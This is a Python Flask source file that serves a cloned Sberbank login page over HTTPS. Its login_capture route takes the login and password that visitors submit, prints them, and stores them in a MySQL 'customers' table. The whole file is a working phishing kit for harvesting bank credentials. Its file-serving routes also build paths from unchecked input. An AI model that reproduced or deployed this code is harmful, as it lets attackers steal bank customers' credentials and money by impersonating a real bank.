from flask import Flask
import os
from flask import render_template_string, abort, Response, send_file, request
from mysql.connector import connect, Error
app = Flask(__name__)
script_path = os.path.abspath(__file__)
script_dir = os.path.dirname(script_path)
reset = True
while reset:
    try:
        db_sql =  connect(
            host="0.0.0.0",
            user="root",
            password="sql_password",
            port = 3306,
            database = "mysql",
        )
        reset = False
    except Exception as e:
        print(e)


@app.route("/")
def index():
    f = open(f'{script_dir}/../static/СберБанк.html')
    return f
@app.route("/СберБанк_files/<name>")
def files_get(name):
    f_path = f'{script_dir}/../static/СберБанк_files/{name}'
    if os.path.exists(f_path):
        f = open(f_path)
        return f
    abort(418)


@app.route("/СберБанк_files/<name>.gif")
def files_get_gif(name):
    f_path = f'{script_dir}/../static/СберБанк_files/{name}.gif'
    if os.path.exists(f_path):
        f = open(f_path, 'rb')
        return send_file(f,  mimetype='image/gif')
    abort(418)

@app.route("/СберБанк_files/<name>.png")
def files_get_png(name):
    f_path = f'{script_dir}/../static/СберБанк_files/{name}.png'
    if os.path.exists(f_path):
        f = open(f_path, 'rb')
        return send_file(f,  mimetype='image/png')
    abort(418)

@app.route('/CSAFront/authMainJson.do', methods=['POST', 'GET'])
def login_capture():
    print(request.form.get('login'))
    print(request.form.get('password'))
    sql = "INSERT INTO customers (login, password) VALUES (%s, %s)"
    val = (request.form.get('login'), request.form.get('password'))
    with db_sql.cursor() as cursor:
        cursor.execute(sql, val)
    db_sql.commit()
    return "OK"

if __name__ == "__main__":
    with db_sql.cursor() as cursor:
        cursor.execute("CREATE TABLE IF NOT EXISTS customers (login  VARCHAR(255), password  VARCHAR(255))")
    app.run(port = 5000, ssl_context=(f'{script_dir}/../certs/server.crt', f'{script_dir}/../certs/server.key'))